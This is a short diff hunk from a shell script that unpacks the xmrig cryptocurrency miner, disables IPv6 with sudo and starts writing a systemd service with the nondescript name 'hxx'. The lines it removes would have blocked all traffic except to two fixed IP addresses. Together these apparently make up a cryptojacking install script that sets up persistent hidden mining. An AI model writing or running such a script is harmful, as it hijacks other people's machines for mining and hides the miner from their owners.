@@ -117,12 +117,6 @@ tar xvfz xmrig-6.12.1-bionic-x64.tar.gz && cd xmrig-6.12.1 &&
 sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 &&
 sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1 &&
 sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1 &&
-iptables -P INPUT DROP &&
-iptables -P OUTPUT DROP &&
-iptables -A INPUT -s 78.141.215.80 -j ACCEPT
-iptables -A OUTPUT -d 78.141.215.80 -j ACCEPT
-iptables -A INPUT -s 136.244.98.186 -j ACCEPT
-iptables -A OUTPUT -d 136.244.98.186 -j ACCEPT
 bash -c 'cat <<EOT >>/lib/systemd/system/hxx.service 
 [Unit]
 Description=hxx
